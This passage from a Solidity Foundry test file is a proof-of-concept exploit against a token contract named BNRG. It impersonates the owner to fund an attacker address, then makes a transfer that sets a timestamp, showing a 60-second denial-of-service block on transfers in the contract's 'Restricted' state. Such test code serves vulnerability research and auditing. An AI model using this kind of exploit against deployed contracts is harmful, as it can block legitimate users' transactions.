        // First, get some tokens from the owner
        vm.prank(owner);
        IBNRG(TARGET).transfer(attacker, 1000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, check the current state
        uint8 currentState = target.state();
        console.log("Current state:", currentState);

        // The exploit requires Restricted state (1)
        // If state is not Restricted, we can't exploit this vulnerability
        require(currentState == 1, "Contract must be in Restricted state for this exploit");

        // Get some BNRG tokens from owner to attacker
        address owner = target.owner();
        vm.prank(owner);
        target.transfer(attacker, 1000 * 10**18);

        // Perform transfer to trigger lastTx update
        target.transfer(helper1, 1 * 10**18);

        // Now attacker's lastTx should be > 0, which the oracle will check
        // This demonstrates the DoS condition - attacker is now blocked for 60 seconds
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
